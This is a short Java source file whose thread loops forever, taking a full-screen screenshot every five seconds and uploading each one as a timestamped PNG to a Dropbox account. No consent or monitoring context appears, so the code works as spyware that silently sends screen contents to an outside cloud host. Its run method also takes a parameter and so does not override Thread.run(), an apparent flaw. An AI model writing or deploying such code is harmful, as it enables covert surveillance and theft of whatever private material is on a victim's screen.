import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    public void run(DbxClientV2 client){
        for(;;)
        {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
            Date now = new Date();

            try {
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream imageByte = new ByteArrayOutputStream();
                ImageIO.write(image, "png", imageByte);
                InputStream in = new ByteArrayInputStream(imageByte.toByteArray());
                client.files().uploadBuilder("/" + dateFormat.format(now) + ".png").uploadAndFinish(in);
            } catch (Exception ex) {
                ex.printStackTrace();
            }

            try{
                sleep(5000);
            }catch (InterruptedException ex){
                ex.printStackTrace();
            }
        }
    }
}
